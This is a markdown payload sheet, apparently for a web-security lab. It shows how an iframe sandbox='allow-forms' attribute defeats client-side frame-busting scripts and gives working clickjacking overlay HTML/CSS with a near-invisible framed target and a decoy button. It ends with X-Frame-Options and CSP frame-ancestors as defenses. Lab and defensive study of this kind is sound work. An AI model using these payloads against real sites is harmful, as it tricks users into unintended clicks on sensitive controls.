# Frame-Busting Script — Sandbox Payload

## Purpose

Payload template for testing a target page that uses client-side frame-busting logic.

The technique uses an HTML5 iframe sandbox to restrict top-level navigation while preserving the functionality required by the authorized lab.

---

## Basic Payload

```html
<iframe
    src="https://TARGET"
    sandbox="allow-forms">
</iframe>
```

---

## Important Attribute

```html
sandbox="allow-forms"
```

This permits form submission while sandbox restrictions remain in effect.

Do **not** add:

```text
allow-top-navigation
```

when testing the behavior described in the lab.

---

# Frame-Busting Concept

A target application may contain logic conceptually similar to:

```javascript
if (window.top !== window.self) {
    window.top.location = window.self.location;
}
```

The purpose is to detect framing and attempt to escape the iframe.

---

# Sandbox Concept

The testing flow is:

```text
Target Page
      ↓
Frame-Busting Script
      ↓
Attempts Top-Level Navigation
      ↓
Sandbox Restriction
      ↓
Top-Level Navigation Restricted
      ↓
Target Remains in iframe
```

---

# Clickjacking Overlay

After confirming the target remains framed, the iframe can be combined with a decoy.

```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.1;
        z-index: 2;
    }

    div {
        position: absolute;
        top: 400px;
        left: 80px;
        z-index: 1;
    }
</style>

<div>Click me</div>

<iframe
    src="https://TARGET"
    sandbox="allow-forms">
</iframe>
```

---

# Final Payload

After aligning the target control:

```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.0001;
        z-index: 2;
    }

    div {
        position: absolute;
        top: 400px;
        left: 80px;
        z-index: 1;
    }
</style>

<div>Click me</div>

<iframe
    src="https://TARGET"
    sandbox="allow-forms">
</iframe>
```

---

# Testing Workflow

```text
Identify Target
      ↓
Inspect Frame-Busting JavaScript
      ↓
Create iframe
      ↓
Observe Frame-Busting
      ↓
Add sandbox="allow-forms"
      ↓
Verify Target Remains Framed
      ↓
Identify Sensitive Control
      ↓
Create Decoy
      ↓
Align Target
      ↓
Reduce Opacity
      ↓
Test Interaction
```

---

# Frame-Busting Indicators

When reviewing the target JavaScript, search for:

```text
window.top
window.self
top.location
parent.location
```

The exact implementation depends on the target application.

---

# Alignment

During testing:

```css
opacity: 0.1;
```

Use this to identify the target control.

Adjust:

```css
top
left
width
height
```

until the decoy is aligned.

After alignment:

```css
opacity: 0.0001;
```

---

# Important Configuration

Use:

```html
sandbox="allow-forms"
```

and avoid:

```text
allow-top-navigation
```

for the specific sandbox behavior demonstrated by the lab.

---

# Testing Checklist

```text
☐ Target is authorized
☐ Frame-busting script identified
☐ Target page tested in iframe
☐ Sandbox behavior tested
☐ allow-forms included where required
☐ allow-top-navigation omitted
☐ Target remains framed
☐ Sensitive control identified
☐ Decoy aligned
☐ Interaction verified
☐ Final PoC tested
```

---

# Key Learning

The important concept demonstrated by this payload is:

```text
Client-Side Frame-Busting
        +
iframe Sandbox Restrictions
        ↓
Frame-Busting Behavior Can Be Affected
```

For production defenses, framing should be controlled through appropriate HTTP security policies such as:

```http
X-Frame-Options
```

and:

```http
Content-Security-Policy: frame-ancestors
```